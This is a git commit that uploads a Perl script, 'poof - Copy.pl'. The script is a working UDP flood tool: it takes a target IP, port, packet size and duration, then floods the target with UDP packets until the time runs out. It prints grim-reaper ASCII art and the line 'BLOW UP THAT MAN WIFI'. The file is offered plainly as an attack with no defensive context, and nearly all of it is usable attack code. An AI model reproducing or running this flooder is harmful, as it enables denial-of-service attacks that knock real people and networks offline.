9b27c356d47d1c3c9da78e487b04863f03e7e2fb
ninjaprogamer69 <56235836+ninjaprogamer69@users.noreply.github.com>
2019-10-08 21:14:50 -0400

    Add files via upload

---
+++ poof - Copy.pl
@@ -0,0 +1,39 @@
+use Socket;
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "Usage: perl poof.pl <Target> <Port> <Packet Size> <Time>\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print " GIVE ME YOUR SOUL YaboiAj Made him sum fire scripts               ...                            
+             ;::::;                           
+           ;::::; :;                          
+         ;:::::'   :;                         
+        ;:::::;     ;.                        
+       ,:::::'       ;           OOO\        
+       ::::::;       ;          OOOOO\        
+       ;:::::;       ;         OOOOOOOO       
+      ,;::::::;     ;'         / OOOOOOO     
+    ;:::::::::`. ,,,;.        /  / DOOOOOO    
+  .';:::::::::::::::::;,     /  /     DOOOO   
+ ,::::::;::::::;;;;::::;,   /  /        DOOO  
+;`::::::`'::::::;;;::::: ,#/  /          DOOO 
+:`:::::::`;::::::;;::: ;::#  /            DOOO
+::`:::::::`;:::::::: ;::::# /              DOO
+`:`:::::::`;:::::: ;::::::#/               DOO
+ :::`:::::::`;; ;:::::::::##                Oo
+ ::::`:::::::`;::::::::;:::#                OO
+ `:::::`::::::::::::;'`:;::#                O 
+  `:::::`::::::::;' /  / `:#                  
+   ::::::`:::::;'  /  /   `#                        
+   $ip on port $port with $size byte packets for $time seconds\n";
+print "BLOW UP THAT MAN WIFI";
+
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+
+  send(flood, pack("a$psize","01010101"), 0, pack_sockaddr_in($pport, $iaddr));}
